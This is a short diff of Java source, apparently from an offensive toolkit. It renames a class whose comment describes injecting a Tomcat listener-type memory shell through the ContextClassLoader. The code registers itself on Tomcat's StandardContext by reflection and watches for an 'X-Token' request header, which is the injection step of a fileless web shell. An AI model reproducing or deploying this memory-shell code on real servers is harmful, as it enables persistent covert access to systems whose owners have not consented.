@@ -13,9 +13,9 @@ import java.lang.reflect.Method;
  * ContextClassLoader 注入 Tomcat Listener 型内存马
  * Tomcat 8 9
  */
-public class TomcatListenerContextClassMS implements ServletRequestListener {
+public class TomcatListenerWebAppMS implements ServletRequestListener {
     private static String header = "X-Token";
-    public TomcatListenerContextClassMS() {
+    public TomcatListenerWebAppMS() {
 
     }
 
@@ -36,7 +36,7 @@ public class TomcatListenerContextClassMS implements ServletRequestListener {
                 standardContext = getFieldValue(root, "context");
             }
 
-            TomcatListenerContextClassMS listenerMemShell = new TomcatListenerContextClassMS();
+            TomcatListenerWebAppMS listenerMemShell = new TomcatListenerWebAppMS();
 //            standardContext.addApplicationEventListener(listenerMemShell);
             standardContext.getClass().getDeclaredMethod("addApplicationEventListener", Object.class).invoke(standardContext, listenerMemShell);
 
